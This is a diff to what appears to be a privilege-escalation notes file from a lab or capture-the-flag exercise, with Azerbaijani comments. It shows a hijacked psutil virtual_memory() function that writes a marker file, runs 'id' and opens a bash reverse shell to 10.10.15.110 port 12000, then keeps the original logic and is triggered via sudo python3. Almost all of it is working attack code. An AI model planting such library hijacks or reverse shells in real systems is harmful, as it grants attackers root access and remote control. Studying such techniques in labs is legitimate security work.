@@ -385,15 +385,19 @@ nano /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
 ### Add module
 ```powershell
 def virtual_memory():
-    #### HİJACK BAŞLAYIR ####
+    with open("/tmp/debug.txt", "w") as f:
+        f.write("Hijack calisdi!")
+    # 1. HİJACK - Əvvəlcə zərərli kod işləyir
     import os
-    os.system('id')                          # Test üçün
-    os.system('bash -i >& /dev/tcp/10.10.14.X/4444 0>&1')  # Reverse shell
-    #### HİJACK BİTİR ####
+    os.system('id') # Test üçün
+    # Reverse shell (bash -c istifadəsi daha stabildir)
+    os.system('bash -c "bash -i >& /dev/tcp/10.10.15.110/12000 0>&1"')
+    # 2. Orijinal məntiq - Proqramın işləməsi üçün lazımdır
     global _TOTAL_PHYMEM
     ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
     _TOTAL_PHYMEM = ret.total
-    return ret
+    return ret 
 
 sudo /usr/bin/python3 ./mem_status.py
 ```
